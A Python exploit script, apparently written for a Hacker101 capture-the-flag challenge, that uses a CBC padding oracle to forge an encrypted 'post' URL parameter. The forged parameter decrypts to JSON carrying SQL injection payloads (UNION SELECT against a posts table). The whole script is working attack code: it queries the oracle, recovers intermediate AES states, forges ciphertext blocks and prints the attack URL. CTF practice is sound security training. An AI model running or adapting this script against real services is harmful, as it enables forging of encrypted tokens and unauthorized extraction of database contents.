#!/usr/bin/env python3
"""
Encrypt chosen plaintext with a CBC padding oracle.
Produces a valid ?post= blob that decrypts to PAYLOAD.
"""

import base64
import requests
from urllib.parse import quote

TARGET = "https://6a5f15cb6c90c2b33eabedd6592f6c64.ctf.hacker101.com/"

# Toggle 1 or 2 after the first run
PAYLOAD_CHOICE = 1

PAYLOADS = {
    1: b'{"id":"1 UNION SELECT title,1 FROM posts--","key":"AAAAAAAAAAAAAAAAAAAAAA=="}',
    2: b'{"id":"1 UNION SELECT group_concat(title),1--","key":"AAAAAAAAAAAAAAAAAAAAAA=="}',
}

BLOCK = 16
DEBUG = False

def b64e(b):
    return base64.b64encode(b).decode().replace("+", "-").replace("/", "!").replace("=", "~")

def pkcs7(data):
    pad = BLOCK - (len(data) % BLOCK)
    return data + bytes([pad]) * pad

def is_valid_padding(ct):
    url = f"{TARGET}?post={quote(b64e(ct), safe='')}"
    try:
        r = requests.get(url, timeout=10)
        return "PaddingException" not in r.text
    except Exception:
        return False

def intermediate(block):
    """Recover AES decrypt(block) via padding oracle."""
    prev = bytearray(BLOCK)
    inter = bytearray(BLOCK)
    for pad_len in range(1, BLOCK + 1):
        prefix = bytearray(prev)
        for i in range(1, pad_len):
            prefix[-i] = inter[-i] ^ pad_len
        found = False
        for guess in range(256):
            prefix[-pad_len] = guess
            if not is_valid_padding(bytes(prefix) + block):
                continue
            if pad_len < BLOCK:
                chk = bytearray(prefix)
                chk[-pad_len - 1] ^= 1
                if is_valid_padding(bytes(chk) + block):
                    continue
            inter[-pad_len] = guess ^ pad_len
            found = True
            break
        if not found:
            raise RuntimeError(f"oracle failed at pad_len={pad_len}")
        if DEBUG:
            print(f"    byte {BLOCK-pad_len} ok")
    return bytes(inter)

def oracle_encrypt(plaintext):
    pt = pkcs7(plaintext)
    blocks = [pt[i:i+BLOCK] for i in range(0, len(pt), BLOCK)]
    # last ciphertext block can be anything; we work backwards
    ct_blocks = [b"\x00" * BLOCK]
    for idx in range(len(blocks) - 1, -1, -1):
        print(f"[*] Encrypting plaintext block {idx+1}/{len(blocks)}")
        inter = intermediate(ct_blocks[0])
        prev = bytes(a ^ b for a, b in zip(inter, blocks[idx]))
        ct_blocks.insert(0, prev)
    return b"".join(ct_blocks)

if __name__ == "__main__":
    payload = PAYLOADS[PAYLOAD_CHOICE]
    print(f"[*] Payload {PAYLOAD_CHOICE}: {payload.decode()}")
    ct = oracle_encrypt(payload)
    forged = b64e(ct)
    print("\n[*] Forged post:")
    print(forged)
    print("\n[*] URL:")
    print(f"{TARGET}?post={forged}")
